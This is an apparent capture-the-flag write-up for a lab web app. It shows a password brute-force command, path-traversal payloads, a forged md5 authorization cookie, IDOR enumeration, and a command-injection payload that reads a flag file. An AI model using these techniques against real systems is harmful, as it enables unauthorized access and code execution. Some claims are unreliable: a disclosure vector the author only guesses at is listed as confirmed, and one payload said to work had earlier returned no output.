# Pentest Report — Support

## 1. Summary

- **Target:** 10.48.132.133 ("Support Operations Panel")
- **Category:** Web exploitation
- **Status:** Complete
- **Outcome:** Both flags captured. Weak credential (brute-forced), a client-side-disclosed cookie check, an IDOR, and a hardcoded master password chained to admin access; a separate OS command injection in the admin date/time feature gave direct code execution and file read.

## 2. Scope & Environment

| Item | Value |
|---|---|
| Target IP | 10.48.132.133 |
| Hostname/title | Support Operations Panel |
| Date started | 2026-09-06 |

## 3. Methodology / Timeline

Chronological log of actions taken, in order. Filled in as the engagement progresses.

### 2026-09-06 — Initial recon

- Ran `nmap -sC -sV -oN initial.txt 10.48.132.133`
- Open ports:

| Port | Service | Version |
|---|---|---|
| 22/tcp | ssh | OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 |
| 80/tcp | http | Apache httpd 2.4.58 (Ubuntu) |

- HTTP page title: "Support Operations Panel"
- `PHPSESSID` cookie missing `httponly` flag (same pattern as the Recruit challenge)
- Port 80 is the focus for now.

### 2026-09-06 — Directory enumeration

- Ran:
  ```
  gobuster dir -u http://10.48.132.133:80/ -w Desktop/Security_Access/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
- Results:
  ```
  skins                (Status: 301) [Size: 312] [--> http://10.48.132.133/skins/]
  includes             (Status: 301) [Size: 315] [--> http://10.48.132.133/includes/]
  layout               (Status: 301) [Size: 313] [--> http://10.48.132.133/layout/]
  js                   (Status: 301) [Size: 309] [--> http://10.48.132.133/js/]
  ```
- Checked these directories, nothing immediately useful found in them.

### 2026-09-06 — Target IP changed (1st hop): 10.48.171.88 → 10.48.157.227

- Note: the attack box reassigned the target IP mid-engagement, before the login brute-force below. Same host/challenge, IP change only.

### 2026-09-06 — Login page credential brute-force

- Login page listed a contact for login help: `help@support.thm`.
- Brute-forced the password for that account:
  ```
  ffuf -w Desktop/Security_Access/wordlists/10-million-password-list-top-1000000.txt \
    -u http://10.48.132.133/ -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=help%40support.thm&password=FUZZ" \
    -fr "Invalid credentials"
  ```
- **Result: password found — `snoopy`.**
- **Credentials obtained:** `help@support.thm` / `snoopy`
- Logged into the site successfully with these credentials.

### 2026-09-06 — Theme selector found, possible LFI/directory traversal

- After logging in, found a theme switcher with options: default, red, blue, green.
- These themes appear to map to `.php` files inside the `/skins/` directory found during gobuster enumeration.
- Hypothesis: if the theme parameter is used to build a file path/include without sanitization, this could allow Local File Inclusion or directory traversal by manipulating the theme value. Needs testing before confirming as a finding.

- Identified the request:
  ```
  GET /dashboard.php?skin=red HTTP/1.1
  ```
- The `skin` parameter value has `.php` appended server-side before being loaded (e.g. `skin=red` → `skins/red.php`).

- Tested: `?skin=../../../../home/ubuntu/user.txt%00`
- Result: request got redirected/normalized to `GET / HTTP/1.1` instead of returning file contents.
- Some server-side filter is rejecting or sanitizing this payload before it reaches the include. Needs a bypass.

### 2026-09-06 — Box reset, target IP changed (2nd hop): 10.48.157.227 → 10.48.132.133

- The site became stuck/unresponsive after the brute-force attempts, requiring a box reset.
- New target IP after reset: `10.48.132.133`. All scope references throughout this document use this final IP. Same challenge/host, IP change only.

### 2026-09-06 — PHP filename enumeration

- Ran:
  ```
  gobuster dir -u http://10.48.132.133 -w Desktop/Security_Access/wordlists/SecLists/Discovery/Web-Content/Programming-Language-Specific/Common-PHP-Filenames.txt --threads 80
  ```
- Results:
  ```
  index.php            (Status: 200) [Size: 2591]
  config.php           (Status: 200) [Size: 0]
  logout.php           (Status: 302) [Size: 0] [--> index.php]
  info.php             (Status: 200) [Size: 73310]
  footer.php           (Status: 200) [Size: 1253]
  dashboard.php        (Status: 302) [Size: 0] [--> index.php]
  api.php              (Status: 302) [Size: 0] [--> index.php]
  ```
- `dashboard.php` and `api.php` redirect to `index.php` — likely require an authenticated session (matches earlier login requirement).
- `config.php` returns 200 with size 0 — direct access returns nothing visible, but exists on the server.
- `info.php` returns a large response (73310 bytes) — worth checking (possibly a `phpinfo()` page, which would leak server configuration).
- Confirmed: `info.php` is a `phpinfo()` page, showing PHP version, config, and other server details. Noted for later reference (e.g. disabled functions, `include_path`, upload settings) if needed for further exploitation.

### 2026-09-06 — Source code disclosure on api.php

- Accessing `api.php` directly returns an "unauthorized"-style response, but the PHP source code itself was disclosed (likely via the LFI/traversal vector on the `skin` parameter, since `.php` extension handling there could expose raw source instead of executing it).
- Full source obtained:
  ```php
  <?php
  session_start();

  if (!isset($_SESSION['loggedin'])) {
      header('Location: index.php');
      exit;
  }

  if (($_COOKIE['isITUser'] ?? md5('false')) !== md5('true')) {
      die('Access denied');
  }

  include('/var/www/db.php');

  $id = $_GET['id'] ?? $_SESSION['user_id'];
  $user = $users[$id] ?? null;

  if (preg_match('#^/user/#', $_SERVER['REQUEST_URI'])) {
      header('Content-Type: application/json');
      unset($user['password']);
      echo json_encode($user, JSON_PRETTY_PRINT);
      exit;
  }
  ?>
  ```
- **Key logic identified:**
  - Requires an active session (`$_SESSION['loggedin']`) — already satisfied via the `help@support.thm` / `snoopy` login.
  - Requires a cookie `isITUser` whose value equals `md5('true')` — a straightforward cookie-value bypass, not a session/auth check tied to any server-side state.
  - Includes `/var/www/db.php` — absolute path disclosed, useful for the earlier `skin` parameter traversal target.
  - `$id` is taken from `$_GET['id']` if present, otherwise falls back to the session's `user_id` — looks like an IDOR: an authenticated user can likely pass `?id=` to look up other users' records.
  - Route matching `^/user/` returns the looked-up user as JSON with `password` stripped — but this suggests other routes/paths on this endpoint might not strip it, or that the `/user/` prefix requirement itself might be bypassable.

### 2026-09-06 — Cookie bypass confirmed, api.php access gained

- Default/current cookie value was checked and found to equal `md5('false')`.
- Set cookie `isITUser` to `md5('true')` = `b326b5062b2f0e69046810717534cb09` (per the source, the actual comparison target).
- **Result: access to `api.php` granted.** Cookie-based authorization bypassed by simply supplying the hash the code expects, since the check has no server-side binding to an actual IT-user role.

### 2026-09-06 — api.php reveals own profile, admin flag identified

- After gaining access, `api.php` displayed a hint: "As a helpdesk user, you can query your own profile: /user/3."
- Request: `GET /user/3`
- Response:
  ```json
  {
      "email": "help@support.thm",
      "2FA": false,
      "admin": false
  }
  ```
- **Target identified:** the `admin` field on this user record. If it can be flipped to `true` (via IDOR on another user's record that already has admin, a write/update path, or some other manipulation), that would grant admin login.

### 2026-09-06 — IDOR confirmed, admin account identified

- Tested other IDs via the `id` GET parameter (no per-user access restriction observed — endpoint IDOR).
- Request: `GET /user/1`
- Response:
  ```json
  {
      "email": "specialadmin@support.thm",
      "2FA": false,
      "admin": true
  }
  ```
- **Confirmed IDOR:** any authenticated user (with the cookie bypass applied) can query arbitrary user IDs via this endpoint, with no ownership check.
- **Admin account identified:** `specialadmin@support.thm`, `admin: true`, `2FA: false`.
- Next planned approach: brute-force the password for `specialadmin@support.thm` (2FA reported as disabled, so a discovered password alone may be sufficient for login).

### 2026-09-06 — config.php source disclosure, master password found

- Revisited `config.php` (found empty via direct request earlier during gobuster enum) — obtained its source via the same disclosure vector used on `api.php`.
- Source obtained:
  ```php
  <?php

  $MASTER_PASSWORD = 'support@110';

  $SITE_VER = '1.0';
  $SITE_NAME = 'support_portal';
  ```
- **Master password found:** `support@110`
- Hypothesis: this may function as a universal/backdoor password usable to log in as any account, including `specialadmin@support.thm`. Needs testing.

### 2026-09-06 — Admin login successful, first flag obtained

- Logged into the site as `specialadmin@support.thm` using the master password `support@110`.
- Master password confirmed to work as a backdoor login for the admin account.
- First flag obtained: `THM{I_AM_ADMIN999}` (proof: shown after logging in as `specialadmin@support.thm` with master password `support@110`).

### 2026-09-06 — Admin panel: date/time change feature noted

- Inside the admin account, found a button to change the site's time and date.
- Noted as a potential lead for later (not yet tested — could relate to session/token expiry logic, log manipulation, or a scheduled task, depending on how it's implemented).

### 2026-09-06 — Revisited skin traversal as admin

- Retested: `?skin=../../../../home/ubuntu/user.txt%00`
- Result this time: `500 Internal Server Error` (previously, pre-admin-login, this same payload was redirected/normalized to `GET /`).
- Behavior differs now that the session is authenticated as admin — earlier redirect was likely happening at an auth-check stage before reaching the include logic; the 500 suggests the payload is now actually reaching the file-include code and erroring there instead.

- Working out traversal depth from the disclosed base path `/var/www/db.php`: enough `../` to climb from `/var/www/` up to `/`, then down into `/home/ubuntu/user.txt`.
- Note: the app appends `.php` to the `skin` value automatically (confirmed earlier with `skin=red` → `skins/red.php`), so any traversal payload targeting a non-`.php` file needs a way to stop that suffix from being appended (the `%00` null-byte truncation attempt is one classic technique for this, though it produced a 500 rather than working cleanly, suggesting this PHP version may not support null-byte truncation — a fix present since PHP 5.3.4).

- Tested: `?skin=../../../../home/ubuntu/user.txt/.`
- Result: `200 OK`, but flag content not visible in the response as viewed. Checked page source as well — flag not present there either.
- Pausing this traversal path for now, pivoting to the date/time change feature noted earlier (renders its value into the page, potentially a different injection surface, e.g. command injection if it shells out to `date`/`timedatectl`).

### 2026-09-06 — Command injection candidate found in date/time feature

- Inspected page source around the date/time selector:
  ```html
  <select name="sys" class="form-select" onchange="document.getElementById('sysForm').submit();">
      <option value="date">Date</option>
      <option value='date +"%H:%M:%S"' selected>Time</option>
  </select>
  ```
- **Key observation:** the `sys` field's option values are literal shell command strings (`date`, `date +"%H:%M:%S"`), not simple flags/IDs. This strongly suggests the server takes the `sys` value and passes it directly into a shell execution function (e.g. `system()`, `exec()`, `shell_exec()`) without sanitization.
- **Strong candidate for OS command injection.** Needs testing — e.g. appending shell metacharacters (`;`, `|`, `&&`, backticks) to the submitted value to see if arbitrary commands execute.

- Tested: injected `echo('Hello')` via the `sys` parameter.
- Response: `Only date command is allowed.`
- **Confirms:** the injected input reaches the server-side command construction (the injection point is real), but there's a filter/allow-list requiring the command to relate to `date` in some way. Needs a bypass that satisfies the filter while still executing arbitrary commands (e.g. chaining after a valid `date` invocation, or finding what exact check is being applied).
- Confirmed the same filter applies to both the "Date" and "Time" options — not option-specific. Trying further bypasses.

- Tested a leading `;` to chain a new command after whatever the filter expects:
  - `; alert('hello')` → no output/error (expected, `alert` is a JS function, not a shell command)
  - `; whoami` → no output
  - `;cat /home/ubuntu/user.txt/` → no output (trailing slash breaks `cat` against a regular file)
  - `;cat /home/ubuntu/user.txt` → **flag returned**
- **Confirmed OS command injection**, bypassing the "Only date command is allowed" filter via a leading `;` to chain an arbitrary command after it.
- **Flag obtained via command injection:** `THM{GOT_THE_FLAG001}` (proof: output of `;cat /home/ubuntu/user.txt` via the `sys` parameter in the date/time feature).

## 4. Findings

_(One entry per vulnerability/technique. Filled in as discovered.)_

**Severity methodology:** Each finding is scored with CVSS v3.1 base metrics (vector + score, via the official FIRST.org calculator), which sets the severity band: 9.0-10.0 Critical, 7.0-8.9 High, 4.0-6.9 Medium, 0.1-3.9 Low. Where a finding's standalone CVSS score is lower than its actual role in the attack chain would suggest (e.g. an information-disclosure bug that directly exposed a critical secret), that's called out explicitly rather than inflating the score itself — CVSS scores the vulnerability in isolation, not the chain.

### F1 — Source Code Disclosure via skin Parameter (CONFIRMED)

- **Severity:** Medium — CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`, base score 6.5. Chain note: this finding's CVSS score reflects a straightforward confidentiality-only disclosure, but it was the entry point that exposed the logic and secret behind F2-F4 — without it, none of the rest of the chain was reachable.

- **Description:** The `skin` GET parameter on `dashboard.php` is used to select and include a PHP file from the `/skins/` directory (`skin=red` → `skins/red.php`). Manipulating this parameter disclosed the raw PHP source of `api.php` and `config.php` instead of their executed output, and later allowed directory traversal attempts against arbitrary filesystem paths.
- **Evidence:** Full source of `api.php` and `config.php` obtained (see timeline entries for 2026-09-06, "Source code disclosure on api.php" and "config.php source disclosure, master password found").
- **Impact:** Exposed internal application logic (auth checks, cookie validation, absolute file paths) and a hardcoded master password. Directly enabled every other finding in this chain.
- **How found:** Noticed the theme selector mapped to files in a `/skins/` directory discovered during initial gobuster enumeration; tested the `skin` parameter directly.

### F2 — Client-Side-Style Cookie Authorization Bypass (CONFIRMED)

- **Severity:** Medium — CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`, base score 5.4.
- **Description:** `api.php` gates access behind a cookie check: `$_COOKIE['isITUser']` must equal `md5('true')`. This is not tied to any server-side session state or role — any client can set this cookie value directly to satisfy the check.
- **Evidence:**
  ```php
  if (($_COOKIE['isITUser'] ?? md5('false')) !== md5('true')) {
      die('Access denied');
  }
  ```
  Setting cookie `isITUser=b326b5062b2f0e69046810717534cb09` (md5 of `true`) granted access.
- **Impact:** Trivial authorization bypass once the check logic is known (which it was, via F1). Any authenticated low-privilege user can gain "IT user" access to `api.php`.
- **How found:** Read directly from the disclosed source of `api.php` (F1).

### F3 — Insecure Direct Object Reference (IDOR) in User Lookup API (CONFIRMED)

- **Severity:** Medium — CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`, base score 6.5. Chain note: standalone this is a confidentiality-only disclosure bug, but it's what identified the admin account (`specialadmin@support.thm`) that F4 then took over.
- **Description:** `api.php` (`/user/{id}`) looks up user records by an `id` value taken from `$_GET['id']` with no ownership or access-control check tied to the requesting session. Any authenticated user (post F2 bypass) can enumerate other users' records, including admin accounts.
- **Evidence:**
  - `GET /user/3` → own record (`help@support.thm`, `admin: false`)
  - `GET /user/1` → `specialadmin@support.thm`, `admin: true`, `2FA: false`
- **Impact:** Full user enumeration, including identifying the admin account and its 2FA status, directly enabling the credential attack in F4.
- **How found:** Noticed `$id = $_GET['id'] ?? $_SESSION['user_id']` in the disclosed source (F1), then tested arbitrary `id` values.

### F4 — Hardcoded Master Password Grants Any-Account Login (CONFIRMED)

- **Severity:** Critical — CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, base score 9.8.
- **Description:** `config.php` contains a hardcoded `$MASTER_PASSWORD` that functions as a universal login credential, bypassing per-account passwords entirely.
- **Evidence:**
  ```php
  $MASTER_PASSWORD = 'support@110';
  ```
  Logged into `specialadmin@support.thm` using this value directly, without knowing the account's actual password.
- **Impact:** Complete authentication bypass for any account, including admin, once the master password is known. Combined with F1-F3, this took an unauthenticated attacker to full admin access.
- **How found:** Read directly from the disclosed source of `config.php` (F1). Admin account target identified via F3.

### F5 — OS Command Injection in Admin Date/Time Feature (CONFIRMED)

- **Severity:** High — CVSS 3.1: `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`, base score 7.2. Note: `PR:H` (privileges required: high) reflects that this endpoint requires an authenticated admin session, which pulls the score down from what an unauthenticated RCE would score (9.8). In this engagement admin access was trivially obtainable via F4, so the practical risk is closer to critical than the isolated score suggests.
- **Description:** The admin panel's date/time change feature submits a `sys` parameter whose value is passed into a server-side shell execution call. A weak filter checks that the command relates to `date`, but does not prevent chaining additional commands with a leading `;`.
- **Evidence:**
  ```
  Payload: ;cat /home/ubuntu/user.txt
  Result: file contents returned, including the flag THM{GOT_THE_FLAG001}
  ```
  Prior probe `echo('Hello')` was blocked with `Only date command is allowed.`, confirming a filter exists; `;whoami`, `;cat ...` bypassed it.
- **Impact:** Full OS command execution as the web server user, limited only by that user's filesystem permissions. Demonstrated arbitrary file read; likely extends to full remote code execution.
- **How found:** Noticed the date/time `<select>` element's option values were literal shell command strings (`date +"%H:%M:%S"`) rather than simple flags, suggesting direct shell execution of user-controlled input.

## 5. Exploitation Chain

1. Brute-forced the login page's contact account (`help@support.thm`) using `ffuf`, recovering password `snoopy`. Logged in as a low-privilege helpdesk user.
2. Noticed the dashboard's theme selector maps to files under `/skins/` via a `skin` GET parameter; manipulating it disclosed raw PHP source instead of executed output (**F1**).
3. Read the disclosed source of `api.php`, revealing a cookie-based authorization check (`isITUser` must equal `md5('true')`) with no server-side binding (**F2**), and an IDOR in its user-lookup logic (**F3**).
4. Set the `isITUser` cookie to `md5('true')` to pass the check and access `api.php`.
5. Used the IDOR to query `/user/1`, identifying the admin account `specialadmin@support.thm`.
6. Read the disclosed source of `config.php` via the same `skin` vector, finding a hardcoded master password (**F4**).
7. Logged in as `specialadmin@support.thm` using the master password `support@110` → captured Flag 1 (`THM{I_AM_ADMIN999}`).
8. In the admin panel, found a date/time-change feature whose backing `sys` parameter takes literal shell command strings. Confirmed OS command injection past a weak "date only" filter using a leading `;` (**F5**).
9. Executed `;cat /home/ubuntu/user.txt` → captured Flag 2 (`THM{GOT_THE_FLAG001}`).

## 6. Flag & Proof

- **Flag 1 (admin access):** `THM{I_AM_ADMIN999}`
- **Proof:** Displayed after logging into the admin account `specialadmin@support.thm` using the hardcoded master password `support@110` (see F4).
- **Flag 2 (command injection / file read):** `THM{GOT_THE_FLAG001}`
- **Proof:** Output of `;cat /home/ubuntu/user.txt`, executed via the `sys` parameter in the admin date/time feature (see F5).

## 7. Remediation

_(Optional — fill in if the challenge expects defensive recommendations.)_

## 8. Appendix

_(Raw command output, scripts, screenshots referenced from findings.)_
